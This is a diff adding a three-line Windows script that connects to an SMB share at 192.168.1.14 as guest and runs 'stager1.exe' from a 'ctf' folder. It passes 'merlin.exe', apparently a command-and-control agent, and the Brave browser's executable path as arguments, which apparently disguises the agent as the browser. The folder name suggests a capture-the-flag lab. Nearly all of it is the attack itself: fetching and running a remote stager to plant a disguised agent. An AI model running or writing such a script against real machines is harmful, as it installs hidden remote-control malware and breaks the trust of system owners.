@@ -1,0 +1,3 @@
+net use \\192.168.1.14 /u:guest:
+\\192.168.1.14\ctf\stager1.exe \\192.168.1.14\ctf\merlin.exe 'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe' 'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe'
+exit
